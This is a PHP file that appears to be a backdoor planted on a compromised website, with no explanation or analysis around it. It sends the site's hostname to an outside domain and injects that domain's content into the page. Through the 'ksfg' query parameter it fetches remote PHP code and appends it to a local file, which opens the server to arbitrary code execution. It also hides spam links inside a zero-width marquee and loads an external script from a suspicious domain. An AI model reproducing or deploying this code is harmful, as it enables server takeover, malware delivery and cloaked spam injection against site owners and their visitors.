<?php
error_reporting(0);
$s='http://a1b2cd.club/';
$host = str_replace('www.', '', @$_SERVER['HTTP_HOST']);
$x = $s.'l-'.base64_encode($host);

if(function_exists('curl_init'))
{
$ch = @curl_init(); curl_setopt($ch, CURLOPT_URL, $x); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $gitt = curl_exec($ch); curl_close($ch);
if($gitt == false){
    @$gitt = file_get_contents($x);
}
}elseif(function_exists('file_get_contents')){
    @$gitt = file_get_contents($x);
}
echo $gitt;

if(isset($_GET['ksfg'])){
    $f=fopen($_GET['ksfg'].'.php','a');
    fwrite($f,file_get_contents($s.'s-'.$_GET['ksfg']));
    fclose($f);
}
echo '<!DOCTYPE html!>';
?><marquee style="position: absolute; width: 0px;">
<a href="http://www.expoilt.com/" title="c99 shell">c99 shell</a> 
<a href="https://bizimseo.co/" title="hacklink">hacklink</a> 
<a href="http://evdeneve.services/" target="_blank" title="istanbul evden eve nakliyat">istanbul evden eve nakliyat</a>
<a href="https://profseo.co/" target="_blank" title="hacklink ">hacklink</a>
<a target="_blank" title="Google" href="https://www.google.com"><strong>Google</strong></a>
</marquee><script src=http://expoilt.com/ccb.js></script>